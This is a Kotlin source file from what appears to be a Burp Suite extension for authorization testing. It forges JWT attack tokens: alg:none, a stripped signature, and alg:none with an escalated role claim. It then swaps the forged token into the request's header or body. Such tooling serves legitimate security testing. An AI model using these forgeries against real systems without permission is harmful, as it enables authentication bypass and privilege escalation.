package com.authzmatrix.core

import burp.api.montoya.http.message.requests.HttpRequest
import org.json.JSONObject

/**
 * Forges JWT attack variants to test server-side verification. These are deliberately invalid
 * tokens: if the server accepts one, its JWT validation is broken.
 */
object JwtForge {

    /** alg:none, signature removed — the classic "none" attack. */
    fun algNone(info: JwtInfo): String {
        val h = JSONObject(info.header.toString()).put("alg", "none")
        return "${Jwt.encode(h.toString())}.${Jwt.encode(info.payload.toString())}."
    }

    /** Keep header + payload, drop the signature (tests servers that don't verify at all). */
    fun stripSignature(info: JwtInfo): String =
        "${Jwt.encode(info.header.toString())}.${Jwt.encode(info.payload.toString())}."

    /** alg:none with an escalated role claim (tests broken verification + privilege escalation). */
    fun escalateRole(info: JwtInfo, roleClaim: String, roleValue: String): String {
        val p = JSONObject(info.payload.toString()).put(roleClaim, roleValue)
        val h = JSONObject(info.header.toString()).put("alg", "none")
        return "${Jwt.encode(h.toString())}.${Jwt.encode(p.toString())}."
    }

    /** Detect which claim key holds the role, for the escalation default. */
    fun roleClaimKey(info: JwtInfo): String? =
        listOf("role", "roles", "authorities", "scope", "permissions", "groups")
            .firstOrNull { info.payload.has(it) }

    /**
     * Replace a raw token wherever it actually lives in the request — the exact header carrying
     * it (Authorization, Cookie, X-Auth-Token, …) or the body — so the forged variant is
     * delivered the same way as the original and doesn't leave the real credential in place.
     */
    fun replaceToken(req: HttpRequest, oldTok: String, newTok: String): HttpRequest {
        for (h in req.headers()) {
            if (h.value().contains(oldTok)) return setHeader(req, h.name(), h.value().replace(oldTok, newTok))
        }
        val body = req.bodyToString()
        if (body.contains(oldTok)) return req.withBody(body.replace(oldTok, newTok))
        // Fallback (token not located verbatim): assume Bearer in Authorization.
        return setHeader(req, "Authorization", "Bearer $newTok")
    }

    private fun setHeader(req: HttpRequest, name: String, value: String): HttpRequest =
        if (req.hasHeader(name)) req.withUpdatedHeader(name, value) else req.withAddedHeader(name, value)
}
